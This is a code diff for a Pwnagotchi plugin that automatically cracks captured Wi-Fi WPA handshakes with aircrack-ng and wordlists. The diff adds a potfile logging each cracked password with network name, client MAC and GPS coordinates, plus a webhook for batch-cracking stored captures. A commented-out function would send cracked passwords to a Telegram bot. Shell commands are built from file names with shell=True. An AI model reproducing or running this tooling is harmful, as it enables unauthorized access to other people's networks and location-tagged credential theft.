@@ -19,11 +19,11 @@ from datetime import datetime
 # Plugin will cycle through as many .txt files as you have in your wordlists/ starting with the 3 primary 
 # files you set in your config.toml then it moves 3 files at a time, smallest to largest, with a 3 second wait between files.
 # As a tool and for education, it also scores password strength based on how fast it was cracked if at all.
-# I built it to run through my 665 .txt files without spiking the cpu to 100%. Enjoy!
+# I built it to run through large .txt files without spiking the cpu to 100%. Enjoy!
 
 class QuickDic(plugins.Plugin):
     __author__ = 'ZeroDumb'
-    __version__ = '1.1.3'
+    __version__ = '1.1.4'
     __license__ = 'GPL3'
     __description__ = 'Run a quick dictionary scan against captured handshakes, display password on screen using display-password.py. Optionally send found passwords as qrcode and plain text over to telegram bot.'
     __dependencies__ = {
@@ -39,7 +39,8 @@ class QuickDic(plugins.Plugin):
         'wordlists_per_batch': 3,  # Number of wordlists to process at once
         'batch_delay': 3,  # Delay between batches in seconds
         'priority_wordlists': ['rockyou-75.txt', 'darkc0de.txt', 'john-the-ripper.txt'],  # Most common wordlists first
-        'security_log': '/home/pi/security_audit.log'
+        'security_log': '/home/pi/security_audit.log',
+        'potfile_path': '/home/pi/handshakes/quickdic.cracked.potfile'
     }
 
     def __init__(self):
@@ -49,6 +50,8 @@ class QuickDic(plugins.Plugin):
         self.start_time = None
         self.attempted_wordlists = set()
         self.total_passwords_checked = 0
+        self.processed_files = set()  # Track processed handshake files
+        self.processed_files_log = '/home/pi/handshakes/quickdic_processed_files.log'
 
     def on_loaded(self):
         logging.info('[quickdic_throttled] plugin loaded')
@@ -73,6 +76,12 @@ class QuickDic(plugins.Plugin):
             self.options['priority_wordlists'] = ['rockyou-75.txt', 'darkc0de.txt', 'john-the-ripper.txt']
         if 'security_log' not in self.options:
             self.options['security_log'] = '/home/pi/security_audit.log'
+        if 'potfile_path' not in self.options:
+            self.options['potfile_path'] = '/home/pi/handshakes/quickdic.cracked.potfile'
+            
+        # Debug: Log current configuration
+        logging.info(f'[quickdic] Current options: {self.options}')
+        logging.info(f'[quickdic] Priority wordlists from config: {self.options.get("priority_wordlists", "NOT SET")}')
             
         # Check aircrack-ng installation
         check = subprocess.run(
@@ -85,7 +94,26 @@ class QuickDic(plugins.Plugin):
         else:
             logging.warning('[quickdic] aircrack-ng is not installed!')
 
-        # List and sort wordlists
+        # Load wordlists
+        self._load_wordlists()
+        
+        # Load previously processed files
+        self._load_processed_files()
+
+    def on_config_changed(self, config):
+        """Called when configuration changes"""
+        # Update options from config
+        if 'quickdic_throttled' in config['main']['plugins']:
+            plugin_config = config['main']['plugins']['quickdic_throttled']
+            for key, value in plugin_config.items():
+                self.options[key] = value
+            
+            # Reload wordlists with new configuration
+            self._load_wordlists()
+            logging.info('[quickdic] Configuration updated, reloaded wordlists')
+
+    def _load_wordlists(self):
+        """Load and sort wordlists based on current configuration"""
         try:
             all_wordlists = [f for f in os.listdir(self.options['wordlist_folder']) if f.endswith('.txt')]
             
@@ -105,6 +133,35 @@ class QuickDic(plugins.Plugin):
         except Exception as e:
             logging.error(f'[quickdic] Error listing wordlists: {str(e)}')
             self.wordlists = []
+
+    def _load_processed_files(self):
+        """Load list of previously processed files from log"""
+        try:
+            if os.path.exists(self.processed_files_log):
+                with open(self.processed_files_log, 'r') as f:
+                    for line in f:
+                        filename = line.strip()
+                        if filename:
+                            self.processed_files.add(filename)
+                logging.info(f'[quickdic] Loaded {len(self.processed_files)} previously processed files')
+            else:
+                logging.info('[quickdic] No processed files log found, starting fresh')
+        except Exception as e:
+            logging.error(f'[quickdic] Error loading processed files: {str(e)}')
+
+    def _save_processed_file(self, filename):
+        """Save a processed file to the log"""
+        try:
+            with open(self.processed_files_log, 'a') as f:
+                f.write(f'{filename}\n')
+            self.processed_files.add(filename)
+            logging.info(f'[quickdic] Marked {filename} as processed')
+        except Exception as e:
+            logging.error(f'[quickdic] Error saving processed file: {str(e)}')
+
+    def _is_file_processed(self, filename):
+        """Check if a file has already been processed"""
+        return filename in self.processed_files
 
     def _get_current_cpu_usage(self):
         """Get current CPU usage percentage using top command"""
@@ -190,6 +247,99 @@ class QuickDic(plugins.Plugin):
         result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
         return result.stdout.decode('utf-8').strip()
 
+    def _parse_gps_data(self, filename):
+        """Parse GPS data from associated .gps.json or .geo.json files"""
+        gps_data = {'lat': '', 'lon': '', 'alt': ''}
+        
+        # Try to find GPS data files
+        base_path = os.path.splitext(filename)[0]
+        gps_files = [
+            f"{base_path}.gps.json",
+            f"{base_path}.geo.json"
+        ]
+        
+        for gps_file in gps_files:
+            if os.path.exists(gps_file):
+                try:
+                    with open(gps_file, 'r') as f:
+                        gps_info = json.load(f)
+                        
+                    # Handle different GPS file formats
+                    if 'lat' in gps_info and 'lon' in gps_info:
+                        gps_data['lat'] = str(gps_info['lat'])
+                        gps_data['lon'] = str(gps_info['lon'])
+                        if 'alt' in gps_info:
+                            gps_data['alt'] = str(gps_info['alt'])
+                    elif 'latitude' in gps_info and 'longitude' in gps_info:
+                        gps_data['lat'] = str(gps_info['latitude'])
+                        gps_data['lon'] = str(gps_info['longitude'])
+                        if 'altitude' in gps_info:
+                            gps_data['alt'] = str(gps_info['altitude'])
+                            
+                    logging.info(f'[quickdic] Found GPS data: {gps_data}')
+                    break
+                except Exception as e:
+                    logging.debug(f'[quickdic] Error parsing GPS file {gps_file}: {str(e)}')
+                    continue
+        
+        return gps_data
+
+    def _extract_network_info(self, filename, bssid):
+        """Extract network information from the pcap file or associated files"""
+        network_info = {'ssid': '', 'station_mac': ''}
+        
+        # Try to get SSID from aircrack-ng output
+        try:
+            cmd = f'aircrack-ng {filename} | grep -E "ESSID|SSID" | head -1'
+            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            if result.stdout:
+                # Parse SSID from output
+                output = result.stdout.decode('utf-8')
+                ssid_match = re.search(r'ESSID:\s*"([^"]*)"', output)
+                if ssid_match:
+                    network_info['ssid'] = ssid_match.group(1)
+        except Exception as e:
+            logging.debug(f'[quickdic] Error extracting SSID: {str(e)}')
+        
+        # Try to get station MAC from aircrack-ng output
+        try:
+            cmd = f'aircrack-ng {filename} | grep -E "Station" | head -1'
+            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            if result.stdout:
+                output = result.stdout.decode('utf-8')
+                # Extract station MAC (format: Station MAC: XX:XX:XX:XX:XX:XX)
+                mac_match = re.search(r'Station MAC:\s*([0-9A-Fa-f:]{17})', output)
+                if mac_match:
+                    network_info['station_mac'] = mac_match.group(1)
+        except Exception as e:
+            logging.debug(f'[quickdic] Error extracting station MAC: {str(e)}')
+        
+        return network_info
+
+    def _write_to_potfile(self, bssid, password, filename):
+        """Write cracked password to potfile with GPS data"""
+        try:
+            # Extract network information
+            network_info = self._extract_network_info(filename, bssid)
+            ssid = network_info['ssid'] or 'Unknown'
+            station_mac = network_info['station_mac'] or 'Unknown'
+            
+            # Parse GPS data
+            gps_data = self._parse_gps_data(filename)
+            
+            # Create potfile entry
+            timestamp = datetime.now().isoformat()
+            potfile_entry = f"{bssid}:{station_mac}:{ssid}:{password}:{gps_data['lat']}:{gps_data['lon']}:{gps_data['alt']}:{timestamp}\n"
+            
+            # Write to potfile
+            with open(self.options['potfile_path'], 'a') as f:
+                f.write(potfile_entry)
+            
+            logging.info(f'[quickdic] Added to potfile: {bssid}:{ssid}:{password}')
+            
+        except Exception as e:
+            logging.error(f'[quickdic] Error writing to potfile: {str(e)}')
+
     def on_handshake(self, agent, filename, access_point, client_station):
         if self.is_cracking:
             logging.info('[quickdic] Already processing a handshake, skipping')
@@ -247,6 +397,9 @@ class QuickDic(plugins.Plugin):
                     self.text_to_set = ""
                     display.update(force=True)
                     
+                    # Write to potfile with GPS data
+                    self._write_to_potfile(result, pwd, filename)
+                    
                     # Emit cracked event for display-password.py
                     plugins.on('cracked', access_point, pwd)
                     
@@ -269,4 +422,147 @@ class QuickDic(plugins.Plugin):
         except Exception as e:
             logging.error(f'[quickdic] Error during cracking: {str(e)}')
         finally:
-            self.is_cracking = False 
+            self.is_cracking = False
+
+    def on_webhook(self, path, request):
+        """Webhook to manually trigger processing of existing handshakes"""
+        from flask import make_response, jsonify, render_template_string
+        
+        # Debug: Log the exact path being called
+        logging.info(f'[quickdic] Webhook called with path: "{path}" (type: {type(path)})')
+        
+        # Handle root path, process_handshakes path, and web UI path
+        if path == "process_handshakes" or path == "" or path == "/" or path is None:
+            try:
+                # Get handshake directory from config
+                handshake_dir = "/home/pi/handshakes"
+                pcap_files = [f for f in os.listdir(handshake_dir) if f.endswith('.pcap')]
+                
+                if not pcap_files:
+                    # Return HTML for web UI
+                    if path == "" or path == "/" or path is None:
+                        html = """
+                        <html>
+                        <head><title>QuickDic Throttled</title></head>
+                        <body>
+                            <h2>QuickDic Throttled Plugin</h2>
+                            <p style="color: red;">No handshake files found in /home/pi/handshakes/</p>
+                            <p>Make sure you have .pcap files in the handshakes directory.</p>
+                        </body>
+                        </html>
+                        """
+                        return make_response(html, 200, {'Content-Type': 'text/html'})
+                    else:
+                        return make_response(jsonify({"status": "error", "message": "No handshake files found"}), 404)
+                
+                # Sort pcap files by modification time (oldest first)
+                pcap_files.sort(key=lambda x: os.path.getmtime(os.path.join(handshake_dir, x)))
+                
+                # Filter out already processed files
+                unprocessed_files = [f for f in pcap_files if not self._is_file_processed(f)]
+                
+                if not unprocessed_files:
+                    # Return HTML for web UI
+                    if path == "" or path == "/" or path is None:
+                        html = f"""
+                        <html>
+                        <head><title>QuickDic Throttled</title></head>
+                        <body>
+                            <h2>QuickDic Throttled Plugin</h2>
+                            <p style="color: orange;">All {len(pcap_files)} handshake files have already been processed!</p>
+                            <p>To reprocess files, delete: <code>{self.processed_files_log}</code></p>
+                            <p><a href="/plugins/quickdic_throttled/process_handshakes">Check Again</a></p>
+                        </body>
+                        </html>
+                        """
+                        return make_response(html, 200, {'Content-Type': 'text/html'})
+                    else:
+                        return make_response(jsonify({"status": "info", "message": "All files already processed"}), 200)
+                
+                # Process the oldest unprocessed handshake file
+                handshake_file = os.path.join(handshake_dir, unprocessed_files[0])
+                logging.info(f'[quickdic] Manually triggered processing of {handshake_file} (oldest unprocessed of {len(unprocessed_files)} unprocessed files)')
+                
+                # Mark file as processed before starting
+                self._save_processed_file(unprocessed_files[0])
+                
+                # Simulate handshake event
+                from pwnagotchi import plugins
+                # Create a minimal access_point object to prevent auto-tune plugin errors
+                access_point = {
+                    'channel': 1,  # Default channel
+                    'ssid': 'Unknown',
+                    'bssid': 'Unknown'
+                }
+                plugins.on('handshake', None, handshake_file, access_point, None)
+                
+                # Return HTML for web UI or JSON for API
+                if path == "" or path == "/" or path is None:
+                    html = f"""
+                    <html>
+                    <head><title>QuickDic Throttled</title></head>
+                    <body>
+                        <h2>QuickDic Throttled Plugin</h2>
+                        <p style="color: green;">Processing handshake: {unprocessed_files[0]}</p>
+                        <p>Found {len(pcap_files)} handshake files total ({len(unprocessed_files)} unprocessed).</p>
+                        <p>Check the logs for progress: <code>tail -f /etc/pwnagotchi/log/pwnagotchi.log | grep quickdic</code></p>
+                        <p><a href="/plugins/quickdic_throttled/process_handshakes">Process Next Handshake</a></p>
+                    </body>
+                    </html>
+                    """
+                    return make_response(html, 200, {'Content-Type': 'text/html'})
+                else:
+                    return make_response(jsonify({
+                        "status": "success", 
+                        "message": f"Processing {unprocessed_files[0]}",
+                        "files_found": len(pcap_files),
+                        "unprocessed_files": len(unprocessed_files)
+                    }), 200)
+                
+            except Exception as e:
+                logging.error(f'[quickdic] Error in webhook: {str(e)}')
+                if path == "" or path == "/" or path is None:
+                    html = f"""
+                    <html>
+                    <head><title>QuickDic Throttled</title></head>
+                    <body>
+                        <h2>QuickDic Throttled Plugin</h2>
+                        <p style="color: red;">Error: {str(e)}</p>
+                        <p>Check the logs for more details.</p>
+                    </body>
+                    </html>
+                    """
+                    return make_response(html, 500, {'Content-Type': 'text/html'})
+                else:
+                    return make_response(jsonify({"status": "error", "message": str(e)}), 500)
+        
+        logging.warning(f'[quickdic] Invalid webhook path: "{path}"')
+        return make_response(jsonify({"status": "error", "message": "Invalid endpoint"}), 404)
+
+#    def _send_message(self, filename, password):
+#        """Send cracked password to Telegram bot"""
+#        try:
+#            import requests
+#            
+#            # Create message with password and file info
+#            message = f"🔓 Password Cracked!\n\n"
+#            message += f"📁 File: {os.path.basename(filename)}\n"
+#            message += f"🔑 Password: {password}\n"
+#            message += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+#            
+#            # Send to Telegram
+#            url = f"https://api.telegram.org/bot{self.options['api']}/sendMessage"
+#            data = {
+#                'chat_id': self.options['id'],
+#                'text': message,
+#                'parse_mode': 'HTML'
+#            }
+#            
+#            response = requests.post(url, data=data)
+#            if response.status_code == 200:
+#                logging.info(f'[quickdic] Password sent to Telegram: {password}')
+#            else:
+#                logging.error(f'[quickdic] Failed to send to Telegram: {response.text}')
+#                
+#        except Exception as e:
+#            logging.error(f'[quickdic] Error sending to Telegram: {str(e)}') 
